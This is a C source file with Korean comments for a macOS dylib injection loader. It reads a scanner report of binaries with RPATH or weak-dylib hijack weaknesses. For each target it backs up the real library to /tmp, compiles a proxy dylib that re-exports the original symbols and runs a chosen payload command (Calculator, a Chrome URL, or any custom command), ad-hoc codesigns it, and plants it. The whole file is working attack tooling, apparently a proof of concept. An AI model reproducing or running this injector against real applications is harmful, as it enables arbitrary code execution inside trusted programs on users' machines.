#include "result_parser.h"
#include "rpath_injector.h"
#include "weak_dylib_injector.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#define SCANNER_OUTPUT_PATH "payload/report.txt"
#define MY_DYLIB_TEMPLATE_PATH "payload/template.c"
#define PAYLOAD_COMMAND_DEFAULT "open -a Calculator"  // 기본값
#define PAYLOAD_COMMAND_CHROME "open -a 'Google Chrome' 'https://i.namu.wiki/i/7-eaeisVmZ_joiDT9HAtTglopaqOmLAzjoZ8Q0wBc9Q6kWTtkmz2Hfqj_NoJppVor3WmCGq7Vrxg3u0HuPwrnF6Ji734kcPLtYlmD_jF23mdh7C1ZgjZVuj4GQohrVIjh5vWQwsHIRjlK-nrCVCd-g.webp'"

// Forward declaration
static int get_user_choice(const char *prompt, int min, int max);

/**
 * 사용자 입력으로 Payload 명령 선택
 */
static const char* get_payload_command(void) {
    printf("\n[*] Payload 명령 선택:\n");
    printf("  1) Calculator 열기 (기본값)\n");
    printf("  2) Chrome에서 이미지 열기\n");
    printf("  3) 커스텀 명령 입력\n");
    
    int choice = get_user_choice("선택", 1, 3);
    
    static char custom_cmd[1024];
    
    switch (choice) {
        case 1:
            return PAYLOAD_COMMAND_DEFAULT;
        case 2:
            return PAYLOAD_COMMAND_CHROME;
        case 3:
            printf("커스텀 명령 입력 (한 줄, 최대 1000자): ");
            fflush(stdout);
            if (fgets(custom_cmd, sizeof(custom_cmd), stdin)) {
                // 마지막 개행 제거
                size_t len = strlen(custom_cmd);
                if (len > 0 && custom_cmd[len-1] == '\n') {
                    custom_cmd[len-1] = '\0';
                }
                return custom_cmd;
            }
            return PAYLOAD_COMMAND_DEFAULT;
        default:
            return PAYLOAD_COMMAND_DEFAULT;
    }
}

// Implementation of get_user_choice (forward declared above)
static int get_user_choice(const char *prompt, int min, int max) {
    char input[256];
    int choice = -1;
    
    while (choice < min || choice > max) {
        printf("%s (%d-%d): ", prompt, min, max);
        fflush(stdout);
        
        if (!fgets(input, sizeof(input), stdin)) {
            return -1;
        }
        
        // 입력 파싱
        char *endptr;
        choice = strtol(input, &endptr, 10);
        
        if (choice < min || choice > max) {
            printf("[✗] 범위를 벗어났습니다. 다시 입력해주세요.\n");
            choice = -1;
        }
    }
    
    return choice;
}

/**
 * dylib 이름 추출 (경로에서)
 * 예: /path/to/libswiftCore.dylib → libswiftCore.dylib
 */
static char* extract_dylib_name(const char *dylib_path) {
    const char *last_slash = strrchr(dylib_path, '/');
    if (last_slash) {
        return strdup(last_slash + 1);
    }
    return strdup(dylib_path);
}

/**
 * 템플릿 파일을 읽고 변수들을 치환하여 dylib.c 생성
 * 
 * @param template_path 템플릿 파일 경로
 * @param dylib_name 대체할 dylib 이름 (예: libnss3.dylib)
 * @param original_dylib_backup_path /tmp에 백업된 원본 dylib 경로
 * @param payload_cmd payload 명령
 * @param output_path 생성될 dylib.c 파일 경로
 * @return 성공 시 true
 */
static bool generate_dylib_source(const char *template_path, 
                                  const char *dylib_name,
                                  const char *original_dylib_backup_path,
                                  const char *payload_cmd,
                                  const char *output_path) {
    printf("\n[*] dylib.c 소스 생성\n");
    printf("   템플릿: %s\n", template_path);
    printf("   출력 경로: %s\n", output_path);
    printf("   대체 dylib: %s\n", dylib_name);
    printf("   백업 경로: %s\n", original_dylib_backup_path);
    printf("   Payload: %s\n", payload_cmd);
    
    // 템플릿 파일 읽기
    FILE *template_fp = fopen(template_path, "r");
    if (!template_fp) {
        fprintf(stderr, "[ERROR] 템플릿 파일을 열 수 없음: %s\n", template_path);
        return false;
    }
    
    // 템플릿 전체 읽기
    char template_content[65536] = {0};
    size_t total_read = 0;
    int ch;
    while ((ch = fgetc(template_fp)) != EOF && total_read < sizeof(template_content) - 1) {
        template_content[total_read++] = ch;
    }
    template_content[total_read] = '\0';
    fclose(template_fp);
    
    if (total_read == 0) {
        fprintf(stderr, "[ERROR] 템플릿 파일이 비어있음\n");
        return false;
    }
    
    // 변수 치환
    char replaced_content[65536] = {0};
    const char *src = template_content;
    char *dst = replaced_content;
    size_t dst_remaining = sizeof(replaced_content) - 1;
    
    while (*src && dst_remaining > 0) {
        // {{DYLIB_NAME}} 찾기
        if (strstr(src, "{{DYLIB_NAME}}") == src) {
            size_t dylib_len = strlen(dylib_name);
            if (dylib_len > dst_remaining) {
                fprintf(stderr, "[ERROR] 출력 버퍼 부족\n");
                return false;
            }
            strcpy(dst, dylib_name);
            dst += dylib_len;
            dst_remaining -= dylib_len;
            src += strlen("{{DYLIB_NAME}}");
        }
        // {{ORIGINAL_DYLIB_BACKUP_PATH}} 찾기
        else if (strstr(src, "{{ORIGINAL_DYLIB_BACKUP_PATH}}") == src) {
            size_t path_len = strlen(original_dylib_backup_path);
            if (path_len > dst_remaining) {
                fprintf(stderr, "[ERROR] 출력 버퍼 부족\n");
                return false;
            }
            strcpy(dst, original_dylib_backup_path);
            dst += path_len;
            dst_remaining -= path_len;
            src += strlen("{{ORIGINAL_DYLIB_BACKUP_PATH}}");
        }
        // {{PAYLOAD_COMMAND}} 찾기
        else if (strstr(src, "{{PAYLOAD_COMMAND}}") == src) {
            size_t cmd_len = strlen(payload_cmd);
            if (cmd_len > dst_remaining) {
                fprintf(stderr, "[ERROR] 출력 버퍼 부족\n");
                return false;
            }
            strcpy(dst, payload_cmd);
            dst += cmd_len;
            dst_remaining -= cmd_len;
            src += strlen("{{PAYLOAD_COMMAND}}");
        }
        // 일반 문자
        else {
            *dst++ = *src++;
            dst_remaining--;
        }
    }
    
    *dst = '\0';
    
    // 생성된 파일 쓰기
    FILE *output_fp = fopen(output_path, "w");
    if (!output_fp) {
        fprintf(stderr, "[ERROR] 출력 파일을 쓸 수 없음: %s\n", output_path);
        return false;
    }
    
    fputs(replaced_content, output_fp);
    fclose(output_fp);
    
    printf("[✓] dylib.c 생성 완료\n");
    return true;
}

/**
 * dylib.c를 컴파일하여 dylib 생성
 * 
 * @param source_path dylib.c 파일 경로
 * @param output_dylib_path 생성될 dylib 파일 경로
 * @param original_dylib_backup_path 원본 dylib의 백업 경로 (심볼 재내보내기용)
 * @param install_name_path dylib의 설치 위치 (예: @executable_path/../Frameworks/libportaudio.dylib)
 *                          NULL이면 @executable_path/../Frameworks/{dylib_filename} 사용
 * @return 성공 시 true
 */
static bool compile_dylib_source(const char *source_path, const char *output_dylib_path, 
                                 const char *original_dylib_backup_path,
                                 const char *install_name_path) {
    printf("\n[*] dylib 컴파일\n");
    printf("   소스: %s\n", source_path);
    printf("   출력: %s\n", output_dylib_path);
    printf("   원본 dylib (링크): %s\n", original_dylib_backup_path);
    printf("   install_name: %s\n", install_name_path ? install_name_path : "(기본값)");
    
    // 백업 파일명 추출 (/tmp/libportaudio.dylib → libportaudio.dylib)
    char *dylib_filename = strrchr(original_dylib_backup_path, '/');
    if (!dylib_filename) {
        dylib_filename = (char *)original_dylib_backup_path;
    } else {
        dylib_filename++;  // '/' 다음부터 시작
    }
    
    // install_name 결정
    char final_install_name[1024];
    if (install_name_path) {
        // Scanner에서 제공한 경로 사용 (예: @executable_path/../Frameworks/libportaudio.dylib)
        strncpy(final_install_name, install_name_path, sizeof(final_install_name) - 1);
        final_install_name[sizeof(final_install_name) - 1] = '\0';
        printf("[*] 지정된 install_name 사용: %s\n", final_install_name);
    } else {
        // 기본값: @executable_path/../Frameworks/{dylib_filename}
        snprintf(final_install_name, sizeof(final_install_name),
                 "@executable_path/../Frameworks/%s", dylib_filename);
        printf("[*] 기본 install_name 사용: %s\n", final_install_name);
    }
    
    // clang 컴파일 명령
    // -fPIC: Position Independent Code
    // -dynamiclib: dylib 생성
    // -undefined dynamic_lookup: 외부 심볼 동적 해석
    // 
    // 핵심 전략:
    // 1. 먼저 다른 install_name(my_libportaudio_temp.dylib)으로 빌드
    //    → 백업 dylib을 링크할 수 있음 (install_name이 다르므로)
    // 2. 빌드 후 install_name_tool로 원본과 같게 변경
    //    → DYLD가 원본 위치에서 우리 dylib 발견
    //    → 백업 dylib의 심볼 모두 제공 ✅
    char temp_install_name[256];
    snprintf(temp_install_name, sizeof(temp_install_name), "my_%s_temp", dylib_filename);
    
    char compile_cmd[2048];
    snprintf(compile_cmd, sizeof(compile_cmd),
             "clang -fPIC -dynamiclib -undefined dynamic_lookup -framework Foundation "
             "-Wl,-install_name,%s "
             "-Wl,-reexport_library,%s "
             "'%s' -o '%s' 2>&1",
             temp_install_name, original_dylib_backup_path, source_path, output_dylib_path);
    
    printf("   [*] 명령: %s\n", compile_cmd);
    printf("   [*] 컴파일 중...\n");
    
    int ret = system(compile_cmd);
    
    if (ret == 0) {
        printf("[✓] 컴파일 완료\n");
        
        // install_name 변경: dylib 자체의 install_name을 지정된 경로로 설정
        // -id: dylib 자체의 install_name 변경 (이게 핵심!)
        printf("\n[*] dylib install_name 변경\n");
        char install_name_tool_cmd[2048];
        snprintf(install_name_tool_cmd, sizeof(install_name_tool_cmd),
                 "install_name_tool -id '%s' '%s' 2>&1",
                 final_install_name, output_dylib_path);
        
        printf("   [*] 명령: %s\n", install_name_tool_cmd);
        int ret2 = system(install_name_tool_cmd);
        
        if (ret2 == 0) {
            printf("[✓] install_name 변경 완료\n");
        } else {
            printf("[WARNING] install_name 변경 실패 (반환값: %d)\n", ret2);
        }
        
        // install_name_tool이 코드 서명을 깰 수 있으므로 다시 서명
        printf("\n[*] 코드 서명\n");
        char codesign_cmd[1024];
        snprintf(codesign_cmd, sizeof(codesign_cmd),
                 "codesign -f -s - '%s' 2>&1", output_dylib_path);
        
        printf("   [*] 명령: %s\n", codesign_cmd);
        int ret3 = system(codesign_cmd);
        
        if (ret3 == 0) {
            printf("[✓] 코드 서명 완료\n");
        } else {
            printf("[WARNING] 코드 서명 실패 (반환값: %d)\n", ret3);
        }
        
        // (순환 참조 방지 - 우리 dylib이 자신의 원래 위치를 의존하면 DYLD가 무한 루프)
        printf("\n[*] 순환 참조 방지: 불필요한 의존성 제거\n");
        char remove_dep_cmd[2048];
        // final_install_name에서 dylib 파일명만 추출해서 변경
        // 예: @executable_path/../Frameworks/libportaudio.dylib → /tmp/libportaudio.dylib
        snprintf(remove_dep_cmd, sizeof(remove_dep_cmd),
                 "install_name_tool -change '%s' '/tmp/%s' '%s' 2>&1",
                 final_install_name, dylib_filename, output_dylib_path);
        
        printf("   [*] 명령: %s\n", remove_dep_cmd);
        int ret4 = system(remove_dep_cmd);
        
        if (ret4 == 0) {
            printf("   [✓] 의존성 제거 완료\n");
        } else {
            printf("   [!] 의존성이 없거나 변경 실패 (반환값: %d)\n", ret4);
        }
        
        // 최종 codesign
        printf("\n[*] 최종 코드 서명\n");
        snprintf(codesign_cmd, sizeof(codesign_cmd), "codesign -f -s - '%s' 2>&1", output_dylib_path);
        int ret5 = system(codesign_cmd);
        if (ret5 == 0) {
            printf("[✓] 최종 서명 완료\n");
        } else {
            printf("[WARNING] 최종 서명 실패\n");
        }
        
        // 생성된 dylib 확인
        char verify_cmd[1024];
        snprintf(verify_cmd, sizeof(verify_cmd), "file '%s' && otool -L '%s' | head -8", output_dylib_path, output_dylib_path);
        printf("\n[*] 생성된 dylib 확인:\n");
        system(verify_cmd);
        
        return true;
    } else {
        fprintf(stderr, "[ERROR] 컴파일 실패 (반환값: %d)\n", ret);
        return false;
    }
}

/**
 * 원본 dylib을 /tmp에 복사
 * 
 * @param absolute_dylib_path Scanner에서 제공한 절대 경로
 * @param dylib_name dylib의 파일명 (예: libnss3.dylib)
 * @return 성공 시 /tmp에 복사된 경로 (동적 할당)
 */
static char* backup_original_dylib(const char *absolute_dylib_path, const char *dylib_name) {
    printf("\n[*] 원본 dylib /tmp에 백업\n");
    printf("   대상 dylib: %s\n", dylib_name);
    printf("   절대 경로: %s\n", absolute_dylib_path);
    
    // 파일 존재 확인
    printf("   [*] 파일 존재 확인 중...\n");
    
    char check_cmd[1024];
    snprintf(check_cmd, sizeof(check_cmd), "[ -f '%s' ] && echo 'exists' || echo 'not_found'", 
             absolute_dylib_path);
    
    FILE *fp = popen(check_cmd, "r");
    if (!fp) {
        fprintf(stderr, "[ERROR] 파일 확인 명령 실행 실패\n");
        return NULL;
    }
    
    char result[32];
    if (!fgets(result, sizeof(result), fp)) {
        pclose(fp);
        fprintf(stderr, "[ERROR] 파일 확인 결과를 읽을 수 없음\n");
        return NULL;
    }
    pclose(fp);
    
    // 결과 확인 (개행 제거)
    size_t len = strlen(result);
    if (len > 0 && result[len-1] == '\n') {
        result[len-1] = '\0';
    }
    
    if (strcmp(result, "exists") != 0) {
        fprintf(stderr, "[ERROR] dylib을 찾을 수 없음: %s\n", absolute_dylib_path);
        fprintf(stderr, "[HINT] Scanner 결과의 절대 경로가 올바른지 확인하세요\n");
        return NULL;
    }
    
    printf("   [✓] 파일 발견\n");
    
    // /tmp에 복사
    char tmp_path[1024];
    snprintf(tmp_path, sizeof(tmp_path), "/tmp/%s", dylib_name);
    
    char copy_cmd[2048];
    snprintf(copy_cmd, sizeof(copy_cmd), "cp -f '%s' '%s' 2>&1", 
             absolute_dylib_path, tmp_path);
    
    printf("   [*] 복사: %s → %s\n", absolute_dylib_path, tmp_path);
    printf("   [*] 명령 실행 중...\n");
    
    int ret = system(copy_cmd);
    if (ret != 0) {
        fprintf(stderr, "[ERROR] dylib 복사 실패 (반환값: %d)\n", ret);
        return NULL;
    }
    
    // 복사 확인
    printf("   [✓] 백업 완료: %s\n", tmp_path);
    
    // 백업 dylib의 install_name 변경 (중요!)
    // 원본: @executable_path/../Frameworks/libportaudio.dylib
    // 변경: /tmp/libportaudio.dylib (실제 파일)로 변경하되, install_name은 /tmp의 경로로 유지
    // 이렇게 하면 우리 dylib이 이 파일을 의존할 때 순환 참조가 되지 않음
    printf("\n   [*] 백업 dylib의 install_name 변경\n");
    
    // /tmp/libportaudio.dylib의 install_name을 그대로 /tmp/libportaudio.dylib로 만들기
    char install_name_cmd[1024];
    snprintf(install_name_cmd, sizeof(install_name_cmd),
             "install_name_tool -id '%s' '%s' 2>&1", tmp_path, tmp_path);
    
    printf("   [*] 명령: %s\n", install_name_cmd);
    int ret2 = system(install_name_cmd);
    
    if (ret2 == 0) {
        printf("   [✓] install_name 변경 완료\n");
    } else {
        printf("   [WARNING] install_name 변경 실패 (반환값: %d)\n", ret2);
    }
    
    // 코드 서명 재설정
    printf("   [*] 코드 서명 재설정\n");
    char codesign_cmd[1024];
    snprintf(codesign_cmd, sizeof(codesign_cmd), "codesign -f -s - '%s' 2>&1", tmp_path);
    
    int ret3 = system(codesign_cmd);
    if (ret3 == 0) {
        printf("   [✓] 코드 서명 완료\n");
    } else {
        printf("   [WARNING] 코드 서명 실패\n");
    }
    
    // 파일 정보 확인
    char file_cmd[1024];
    snprintf(file_cmd, sizeof(file_cmd), "ls -lh '%s' && otool -L '%s' | head -3", tmp_path, tmp_path);
    printf("   [*] 백업 dylib 정보:\n");
    system(file_cmd);
    
    return strdup(tmp_path);
}

/**
 * 취약한 바이너리 하나에 대해 주입 전략 선택 및 수행
 */
static bool handle_target(VulnerableTarget *target) {
    printf("\n╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║  처리 대상: %s\n", target->binary_path);
    printf("╚════════════════════════════════════════════════════════════════════╝\n");
    
    // 취약점 정보 상세 출력
    printf("\n[●] 감지된 취약점:\n");
    if (target->vuln_type == VULN_RPATH) {
        printf("   - RPATH 취약점 (%zu개)\n", target->rpath_count);
        for (size_t i = 0; i < target->rpath_count; i++) {
            printf("     [%zu] %s\n", i + 1, target->rpath_vulns[i]);
        }
    } else if (target->vuln_type == VULN_WEAK_DYLIB) {
        printf("   - Weak Dylib 취약점 (%zu개)\n", target->weak_dylib_count);
        for (size_t i = 0; i < target->weak_dylib_count; i++) {
            printf("     [%zu] %s\n", i + 1, target->weak_dylib_vulns[i]);
        }
    } else if (target->vuln_type == VULN_BOTH) {
        printf("   - RPATH 취약점 (%zu개)\n", target->rpath_count);
        for (size_t i = 0; i < target->rpath_count; i++) {
            printf("     [%zu] %s\n", i + 1, target->rpath_vulns[i]);
        }
        printf("   - Weak Dylib 취약점 (%zu개)\n", target->weak_dylib_count);
        for (size_t i = 0; i < target->weak_dylib_count; i++) {
            printf("     [%zu] %s\n", i + 1, target->weak_dylib_vulns[i]);
        }
    }
    
    // 취약점 목록에서 덮어쓸 dylib 선택
    printf("\n[*] 덮어쓸 dylib 선택\n");
    char **dylib_list = NULL;
    size_t dylib_count = 0;
    
    if (target->vuln_type == VULN_RPATH || target->vuln_type == VULN_BOTH) {
        // RPATH 취약점 목록에서 선택
        printf("   [RPATH 취약 경로]\n");
        dylib_list = target->rpath_vulns;
        dylib_count = target->rpath_count;
        
        for (size_t i = 0; i < dylib_count; i++) {
            printf("   [%zu] %s\n", i + 1, dylib_list[i]);
        }
    } else {
        // Weak Dylib 취약점 목록에서 선택
        printf("   [Weak Dylib 취약 경로]\n");
        dylib_list = target->weak_dylib_vulns;
        dylib_count = target->weak_dylib_count;
        
        for (size_t i = 0; i < dylib_count; i++) {
            printf("   [%zu] %s\n", i + 1, dylib_list[i]);
        }
    }
    
    printf("\n");
    int dylib_choice = get_user_choice("덮어쓸 dylib 선택", 1, (int)dylib_count);
    
    if (dylib_choice < 1 || dylib_choice > (int)dylib_count) {
        printf("[✗] 유효하지 않은 선택\n");
        return false;
    }
    
    const char *selected_dylib_absolute_path = dylib_list[dylib_choice - 1];
    char *dylib_name = extract_dylib_name(selected_dylib_absolute_path);
    
    printf("\n[✓] 선택: %s\n", dylib_name);
    printf("   절대 경로: %s\n", selected_dylib_absolute_path);
    
    // 1단계: 원본 dylib을 /tmp에 백업 - 절대경로를 직접 전달
    char *tmp_backup_path = backup_original_dylib(selected_dylib_absolute_path, dylib_name);
    if (!tmp_backup_path) {
        fprintf(stderr, "[ERROR] 원본 dylib 백업 실패\n");
        free(dylib_name);
        return false;
    }
    
    // 선택된 dylib의 install_name 결정
    // Scanner에서 제공한 경로를 분석하여 적절한 install_name 생성
    char computed_install_name[1024] = {0};
    
    // 만약 절대 경로라면, @executable_path나 @loader_path로 변환 시도
    // 예: /Applications/.../Frameworks/libswiftCore.dylib 
    //     → @executable_path/../Frameworks/libswiftCore.dylib
    if (selected_dylib_absolute_path[0] == '/') {
        // 절대 경로인 경우
        const char *frameworks_pos = strstr(selected_dylib_absolute_path, "Frameworks/");
        if (frameworks_pos) {
            // Frameworks/libXXX.dylib 형식으로 변환
            snprintf(computed_install_name, sizeof(computed_install_name),
                     "@executable_path/../Frameworks/%s", dylib_name);
        } else {
            // 다른 위치면 파일명만 사용
            snprintf(computed_install_name, sizeof(computed_install_name),
                     "@executable_path/../lib/%s", dylib_name);
        }
    } else {
        // 상대 경로인 경우 (예: @rpath/../Frameworks/libXXX.dylib)
        // 그대로 사용 가능
        strncpy(computed_install_name, selected_dylib_absolute_path, sizeof(computed_install_name) - 1);
    }
    printf("   computed install_name: %s\n", computed_install_name);
    
    // 2단계: Payload 명령 선택
    const char *payload_cmd = get_payload_command();
    
    // 3단계: 템플릿에서 dylib.c 생성
    char generated_source[256];
    snprintf(generated_source, sizeof(generated_source), "/tmp/my_dylib_%s.c", dylib_name);
    
    if (!generate_dylib_source(MY_DYLIB_TEMPLATE_PATH, dylib_name, tmp_backup_path, 
                              payload_cmd, generated_source)) {
        fprintf(stderr, "[ERROR] dylib.c 생성 실패\n");
        free(dylib_name);
        free(tmp_backup_path);
        return false;
    }
    
    // 4단계: dylib.c 컴파일 (원본 dylib 경로와 install_name 전달)
    char compiled_dylib[256];
    snprintf(compiled_dylib, sizeof(compiled_dylib), "/tmp/my_dylib_%s.dylib", dylib_name);
    
    if (!compile_dylib_source(generated_source, compiled_dylib, tmp_backup_path, computed_install_name)) {
        fprintf(stderr, "[ERROR] dylib 컴파일 실패\n");
        free(dylib_name);
        free(tmp_backup_path);
        return false;
    }
    
    // 5단계: 사용자에게 주입 방식 확인
    printf("\n[*] 주입 방식 선택\n");
    
    bool use_rpath = (target->vuln_type == VULN_RPATH) ? true : false;
    bool use_weak = (target->vuln_type == VULN_WEAK_DYLIB) ? true : false;
    
    if (target->vuln_type == VULN_BOTH) {
        printf("   [1] RPATH 취약점을 통한 주입\n");
        printf("   [2] Weak Dylib을 통한 주입\n\n");
        
        int method_choice = get_user_choice("주입 방식 선택", 1, 2);
        use_rpath = (method_choice == 1);
        use_weak = (method_choice == 2);
    }
    
    // 6단계: 선택된 방식으로 주입
    bool injection_success = false;
    
    if (use_rpath) {
        printf("\n[*] RPATH 주입 수행\n");
        injection_success = inject_via_rpath(
            compiled_dylib,
            target->binary_path,
            target->rpath_vulns,
            target->rpath_count,
            dylib_name,
            dylib_choice - 1  // 0부터 시작하는 인덱스
        );
    } else if (use_weak) {
        printf("\n[*] Weak Dylib 주입 수행\n");
        injection_success = inject_via_weak_dylib(
            compiled_dylib,
            target->binary_path,
            target->weak_dylib_vulns,
            target->weak_dylib_count,
            dylib_name
        );
    }
    
    free(dylib_name);
    free(tmp_backup_path);
    
    return injection_success;
}

/**
 * 메인 프로그램
 */
int main(int argc, char **argv) {
    printf("════════════════════════════════════════════════════════════════════\n");
    printf("                  macOS Dylib 주입 로더 (Loader)\n");
    printf("          Scanner 결과를 바탕으로 취약한 바이너리에 dylib 주입\n");
    printf("                      [동적 dylib 생성 및 주입]\n");
    printf("════════════════════════════════════════════════════════════════════\n\n");
    
    char *scanner_output = SCANNER_OUTPUT_PATH;
    if (argc > 1) {
        scanner_output = argv[1];
    }
    
    printf("[*] 설정\n");
    printf("   - Scanner 결과 파일: %s\n", scanner_output);
    printf("   - Template 파일: %s\n", MY_DYLIB_TEMPLATE_PATH);
    printf("   - Payload 명령: (사용자 선택)\n\n");
    
    // 1. Scanner 결과 파싱
    printf("[*] Scanner 결과 파싱 중...\n");
    ParsedResults *results = parse_scanner_output(scanner_output);
    
    if (!results || results->target_count == 0) {
        printf("[✗] 취약한 바이너리가 없거나 파싱 실패\n");
        return 1;
    }
    
    // 파싱 결과 출력
    print_parsed_results(results);
    
    // 2. 사용자가 주입할 바이너리 선택
    printf("\n[*] 주입할 바이너리 선택\n");
    for (size_t i = 0; i < results->target_count; i++) {
        printf("   [%zu] %s\n", i + 1, results->targets[i]->binary_path);
    }
    printf("   [0] 모두 주입\n\n");
    
    int target_choice = get_user_choice("선택", 0, (int)results->target_count);
    
    // 3. 선택된 바이너리에 대해 처리
    int processed_count = 0;
    int success_count = 0;
    
    if (target_choice == 0) {
        // 모두 주입
        printf("\n[*] 모든 바이너리 처리 시작...\n");
        for (size_t i = 0; i < results->target_count; i++) {
            processed_count++;
            if (handle_target(results->targets[i])) {
                success_count++;
            }
        }
    } else {
        // 선택된 것만 주입
        printf("\n[*] 선택된 바이너리 처리...\n");
        processed_count = 1;
        if (handle_target(results->targets[target_choice - 1])) {
            success_count++;
        }
    }
    
    // 4. 완료 보고
    printf("\n════════════════════════════════════════════════════════════════════\n");
    printf("                          완료 보고\n");
    printf("════════════════════════════════════════════════════════════════════\n");
    printf("총 취약한 바이너리: %zu개\n", results->target_count);
    printf("처리한 바이너리: %d개\n", processed_count);
    printf("성공: %d개\n", success_count);
    printf("실패: %d개\n", processed_count - success_count);
    
    if (success_count == processed_count && processed_count > 0) {
        printf("\n[✓] 모든 요청한 dylib 주입이 완료되었습니다!\n");
        printf("    다음 단계: 취약한 바이너리를 실행하여 주입 확인\n\n");
    } else if (processed_count > 0) {
        printf("\n[⚠] 일부 주입이 실패했습니다. 위의 오류 메시지를 확인해주세요.\n\n");
    } else {
        printf("\n[*] 처리된 바이너리가 없습니다.\n\n");
    }
    
    free_parsed_results(results);
    return (success_count == processed_count && processed_count > 0) ? 0 : 1;
}